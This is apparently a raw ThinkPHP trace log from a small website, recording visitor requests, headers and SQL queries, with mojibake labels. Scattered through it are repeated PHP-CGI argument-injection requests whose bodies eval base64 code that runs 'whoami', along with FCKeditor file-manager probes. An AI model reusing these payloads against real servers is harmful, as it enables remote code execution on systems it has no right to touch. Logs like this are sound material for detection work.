---------------------------------------------------------------
[ 2024-09-01T01:12:34+08:00 ] 170.106.84.136 GET www.aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š2.312684s] [åžåçŽ‡ï¼š0.43req/s] [å†…å­˜æ¶ˆè€—ï¼š2,949.95kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://www.aosuper.com',
  'pragma' => 'no-cache',
  'connection' => 'close',
  'cache-control' => 'no-cache',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
  'host' => 'www.aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.009781s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.031121s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '170.106.84.136' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.002450s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:1.237095s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '170.106.84.136' [ RunTime:0.007199s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('170.106.84.136' , 1 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 01:12:32' , 2 , 'æ™®é€šç½‘å‹') [ RunTime:0.002592s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '170.106.84.136'  AND `ucookie` IS NULL [ RunTime:0.006638s ]
---------------------------------------------------------------
[ 2024-09-01T01:27:46+08:00 ] 5.181.86.85 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.130678s] [åžåçŽ‡ï¼š7.65req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T01:27:48+08:00 ] 5.181.86.85 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015139s] [åžåçŽ‡ï¼š66.06req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T02:40:48+08:00 ] 5.181.86.85 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.309569s] [åžåçŽ‡ï¼š3.23req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T02:40:49+08:00 ] 5.181.86.85 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015221s] [åžåçŽ‡ï¼š65.70req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T02:59:43+08:00 ] 43.135.166.178 GET www.aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š1.192754s] [åžåçŽ‡ï¼š0.84req/s] [å†…å­˜æ¶ˆè€—ï¼š2,949.94kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://www.aosuper.com',
  'pragma' => 'no-cache',
  'connection' => 'close',
  'cache-control' => 'no-cache',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
  'host' => 'www.aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.020655s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.033750s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '43.135.166.178' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.514553s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000497s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '43.135.166.178' [ RunTime:0.056755s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('43.135.166.178' , 2 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 02:59:42' , 2 , 'æ™®é€šç½‘å‹') [ RunTime:0.000541s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '43.135.166.178'  AND `ucookie` IS NULL [ RunTime:0.007803s ]
---------------------------------------------------------------
[ 2024-09-01T03:57:45+08:00 ] 147.78.47.81 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.310458s] [åžåçŽ‡ï¼š3.22req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T03:57:47+08:00 ] 147.78.47.81 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.016327s] [åžåçŽ‡ï¼š61.25req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T04:32:29+08:00 ] 1.202.249.94 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š1.428067s] [åžåçŽ‡ï¼š0.70req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.88kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'if-modified-since' => 'Thu, 01 Jan 1970 00:00:00 GMT',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-encoding' => 'x-gzip, gzip',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000754s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002884s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '1.202.249.94' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.585735s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000644s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '1.202.249.94' [ RunTime:0.052470s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('1.202.249.94' , 3 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 04:32:28' , 3 , 'æ™®é€šç½‘å‹') [ RunTime:0.018798s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '1.202.249.94'  AND `ucookie` IS NULL [ RunTime:0.007179s ]
---------------------------------------------------------------
[ 2024-09-01T05:02:32+08:00 ] 104.247.184.221 GET aosuper.com/cfide/scripts/ajax/fckeditor/editor/filemanager/browser/default/browser.html
[è¿è¡Œæ—¶é—´ï¼š0.330093s] [åžåçŽ‡ï¼š3.03req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.79kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cfide',
    1 => 'scripts',
    2 => 'ajax',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
  'accept-language' => 'en-US, tr; q=0.5',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'fckeditor' => 'editor',
  'filemanager' => 'browser',
  'default' => 'browser',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T05:02:32+08:00 ] 104.247.184.221 GET aosuper.com/fckeditor/editor/filemanager/browser/default/browser.html
[è¿è¡Œæ—¶é—´ï¼š0.015488s] [åžåçŽ‡ï¼š64.57req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.05kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'fckeditor',
    1 => 'editor',
    2 => 'filemanager',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
  'accept-language' => 'en-US, tr; q=0.5',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'browser' => 'default',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T05:02:33+08:00 ] 104.247.184.221 GET aosuper.com/html/js/editor/fckeditor/editor/filemanager/browser/default/browser.html
[è¿è¡Œæ—¶é—´ï¼š0.016366s] [åžåçŽ‡ï¼š61.10req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.44kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'html',
    1 => 'js',
    2 => 'editor',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
  'accept-language' => 'en-US, tr; q=0.5',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'fckeditor' => 'editor',
  'filemanager' => 'browser',
  'default' => 'browser',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T05:02:34+08:00 ] 104.247.184.221 GET aosuper.com/admin/fckeditor/editor/filemanager/browser/default/browser.html
[è¿è¡Œæ—¶é—´ï¼š0.045518s] [åžåçŽ‡ï¼š21.97req/s] [å†…å­˜æ¶ˆè€—ï¼š1,337.82kb] [æ–‡ä»¶åŠ è½½ï¼š37]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'fckeditor',
    2 => 'editor',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'host' => 'aosuper.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0',
  'accept-language' => 'en-US, tr; q=0.5',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'filemanager' => 'browser',
  'default' => 'browser',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T05:12:59+08:00 ] 147.78.47.81 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015247s] [åžåçŽ‡ï¼š65.59req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T05:13:01+08:00 ] 147.78.47.81 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.016274s] [åžåçŽ‡ï¼š61.45req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T06:24:17+08:00 ] 147.78.47.81 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.629586s] [åžåçŽ‡ï¼š1.59req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T06:24:18+08:00 ] 147.78.47.81 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.016241s] [åžåçŽ‡ï¼š61.57req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T06:55:25+08:00 ] 170.246.52.188 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š1.759330s] [åžåçŽ‡ï¼š0.57req/s] [å†…å­˜æ¶ˆè€—ï¼š2,951.10kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'priority' => 'u=0, i',
  'accept-encoding' => 'gzip, deflate, br, zstd',
  'sec-ch-ua-platform' => '"Linux"',
  'sec-ch-ua-mobile' => '?0',
  'sec-ch-ua' => '"Chromium";v="128", "Not;A=Brand";v="24", "HeadlessChrome";v="128"',
  'sec-fetch-dest' => 'document',
  'sec-fetch-user' => '?1',
  'sec-fetch-mode' => 'navigate',
  'sec-fetch-site' => 'none',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.84 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.008913s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.038573s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '170.246.52.188' ORDER BY `Id` DESC LIMIT 1 [ RunTime:1.402206s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000529s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '170.246.52.188' [ RunTime:0.007199s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('170.246.52.188' , 1 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 06:55:23' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000450s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '170.246.52.188'  AND `ucookie` IS NULL [ RunTime:0.006705s ]
---------------------------------------------------------------
[ 2024-09-01T06:55:27+08:00 ] 170.246.52.188 GET aosuper.com/login.php/index/captcha
[è¿è¡Œæ—¶é—´ï¼š0.461007s] [åžåçŽ‡ï¼š2.17req/s] [å†…å­˜æ¶ˆè€—ï¼š11,518.17kb] [æ–‡ä»¶åŠ è½½ï¼š50]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ BIND ] 'admin'
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'captcha',
  ),
)
[ info ] [ HEADER ] array (
  'priority' => 'i',
  'accept-encoding' => 'gzip, deflate, br, zstd',
  'referer' => 'https://aosuper.com/',
  'sec-fetch-dest' => 'image',
  'sec-fetch-mode' => 'no-cors',
  'sec-fetch-site' => 'same-origin',
  'accept' => 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
  'sec-ch-ua-platform' => '"Linux"',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.84 Safari/537.36',
  'sec-ch-ua-mobile' => '?0',
